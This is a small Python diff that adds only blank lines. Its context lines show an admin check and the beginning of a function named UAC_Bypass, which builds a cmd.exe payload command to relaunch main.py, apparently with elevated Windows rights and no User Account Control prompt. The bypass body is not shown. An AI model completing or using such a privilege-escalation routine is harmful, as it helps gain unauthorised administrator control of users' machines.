@@ -11,6 +11,7 @@ import ctypes
 import sys
 from ctypes import wintypes
 
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -30,6 +31,8 @@ def Universal():
             lwjgl.info("Already have administrator privileges")
     else:
         lwjgl.error("It can only run on Windows")
+
+
 
 def UAC_Bypass():
     payload_cmd = f'cmd.exe /c "cd /d "{pathlib.Path(__file__).parent.parent.parent}" && "{sys.executable}" main.py"'
